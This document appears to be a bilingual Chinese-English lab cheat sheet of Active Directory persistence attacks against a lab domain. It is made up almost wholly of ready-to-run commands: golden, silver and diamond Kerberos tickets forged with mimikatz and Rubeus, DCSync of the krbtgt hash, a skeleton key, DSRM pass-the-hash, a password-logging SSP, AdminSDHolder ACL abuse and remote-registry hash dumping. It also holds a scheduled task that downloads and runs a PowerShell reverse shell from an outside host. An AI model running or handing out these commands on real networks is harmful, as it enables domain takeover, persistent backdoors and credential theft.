# Golden Ticket（金票）
使用krbtgt的哈希制作金票

## mimikatz
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

## SafetyKatz

拿到krbtgt哈希
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

制作金票
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

#  Silver Ticket（银票）

下面例子使用DC的哈希制作一张银票
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:cifs /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

上面是请求CIFS服务

如果请求HOST服务，就会允许在靶机上设置一个定时任务

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

设置定时任务
```
schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object
Net.WebClient).DownloadString(''http://192.168.100.X:8080/Invoke-PowerShellTcp.ps1''')'"
```
执行定时任务
```
schtasks /Run /S us-dc.us.techcorp.local /TN "STCheck"
```

如果请求WMI服务，则会有远程执行能力


# Diamond Ticket（钻票）
需要krbtgt的AES keys

制作一张钻票
```
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /user:studentuserx /password:studentuserxpassword /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

我们还可以使用 /tgtdeleg 选项代替凭据，以防我们以域用户身份访问
```
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


# Skeleton Key（万能钥匙）

制作万能钥匙，密码是：```mimikatz```
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName us-dc
```

使用万能钥匙（mimikatz）用Administrator身份进入机器
```
Enter-PSSession –Computername us-dc –credential us\Administrator
```


如果 lsass是受保护 ，在mimikatz上使用下面命令提升权限，这个操作会留下日志，不是好的opsec
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

# DSRM


Dump DSRM password (needs DA privs)
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername us-dc
```

上面的哈希，与下面命令导出的哈希进行比较
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc
```

第一个就是DSRM local Administrator.


• Since it is the 'local' administrator of the DC, we can pass the hash to authenticate.（由于是DC的本地管理员哈希，因此可以进行PTH利用）
• But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash（不过在此之前需要对登录行为进行更改方能利用）

```
Enter-PSSession -Computername us-dc

New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

使用下面命令pth
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:us-dc /user:Administrator /ntlm:917ecdd1b4287f7051542d0241900cf0 /run:powershell.exe"'
```


如果要使用PSRemoting，必须强制NTLM认证
```
Enter-PSSession -ComputerName us-dc -Authentication Negotiate
```

# Custom SSP


A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are（安全支持提供者（SSP）是一个DLL，它为应用程序提供了获得认证连接的方法。微软提供的一些SSP包有）
– NTLM
– Kerberos
– Wdigest
– CredSSP
• Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.（Mimikatz提供了一个自定义的SSP - mimilib.dll。这个SSP记录了目标服务器上的本地登录、服务账户和机器账户密码的清晰文本）



我们可以使用其中一种方式：

1. 将mimilib.dll放到system32中，并将mimilib添加到HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages。
```
$packages = Get-ItemPropert HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'

$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

2. 使用mimikatz，注入lsass（在Server 2016和2019中不稳定）。
```
Invoke-Mimikatz -Command '"misc::memssp"'
```

# Malicious SSP
DC上的所有本地登录被记录到
```
C:\Windows\system32\kiwissp.log
```

# AdminSDHolder


• Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).（驻留在域的系统容器中，-使用 ACL-用于控制某些内置特权组（称为受保护组）的权限 。）
• Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.（Security Descriptor Propagator (SDPROP) 每小时运行一次，并将受保护组和成员的 ACL 与 AdminSDHolder 的 ACL 进行比较，并在对象 ACL 上覆盖任何差异。）


Protected Groups包括：
```
Account Operators 
Enterprise Admins
Backup Operators 
Domain Controllers
Server Operators 
Read-only Domain Controllers
Print Operators 
Schema Admins
Domain Admins 
Administrators
Replicator
```

以下组用户都可以登录到dc
- ```Account Operators``` :Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
- ```Backup Operators``` :Backup GPO, edit to add SID of controlled account to a privileged group and Restore.
- ```Server Operators``` ：Run a command as system (using the disabled Browser service)
- ```Print Operators``` ：Copy ntds.dit backup, load device drivers.

## 方法1，Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA(以DA身份使用PowerView，为一个用户增加FullControl权限到AdminSDHolder):
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```


## 方法2，使用ActiveDirectory Module和[RACE toolkit](https://github.com/samratashok/RACE)
```
Set-DCPermissions -Method AdminSDHolder -SAMAccountName studentuser1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -Verbose
```

为普通用户添加其他有用的权限，如ResetPassword, WriteMembers到AdminSDHolder
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights ResetPassword -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights WriteMembers -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

## 其他
使用 Invoke-SDPropagator.ps1 手动运行SDProp
```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

对于 Server 2008 之前的机器
```
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

## 使用powerview以普通用户身份查看DA权限
```
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser1"}
```

使用ActiveDirectory Module
```
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access | ?{$_.IdentityReference -match 'studentuser1'}
```

## AdminSDHolder Abuse
1. 利用FullControl权限

使用powerview
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

使用ActiveDirectory Module
```
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

2. 利用 ResetPassword

使用powerview
```
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

使用ActiveDirectory Module
```
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

3. 添加FullControl权限
使用powerview
```
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

使用ActiveDirectory Module
```
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=us,DC=techcorp,DC=local' -Right GenericAll -Verbose
```

4. 添加DCSync权限

使用powerview
```
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

使用ActiveDirectory Module and RACE
```
Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=us,DC=techcorp,DC=local' -GUIDRight DCSync -Verbose
```

执行DCSync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```
or
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

#  Security Descriptors

## WMI

使用 RACE 工具包,为非管理员用户修改ACL以获得访问安全对象
```
. C:\AD\Tools\RACE-master\RACE.ps1
```

在本地机器为student1设置
```
Set-RemoteWMI -SamAccountName studentuser1 –Verbose
```

On remote machine for studentuser1 without explicit credentials:
```
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Verbose
```

On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
```
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Credential Administrator –namespace 'root\cimv2' -Verbose
```

On remote machine remove permissions:
```
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
```

## PowerShell Remoting

使用RACE toolkit

On local machine for studentuser1:
```
Set-RemotePSRemoting -SamAccountName studentuser1 –Verbose
```

On remote machine for studentuser1 without credentials:
```
Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Verbose
```

On remote machine, remove the permissions:
```
Set-RemotePSRemoting -SamAccountName studentuser1 -ComputerName us-dc -Remove
```

## Remote Registry

Using RACE or DAMP toolkit, with admin privs on remote machine
```
Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser1 -Verbose
```

As studentuser1, retrieve machine account hash
```
Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose
```

Retrieve local account hash
```
Get-RemoteLocalAccountHash -ComputerName us-dc -Verbose
```

Retrieve domain cached credentials:
```
Get-RemoteCachedCredential -ComputerName us-dc -Verbose
```

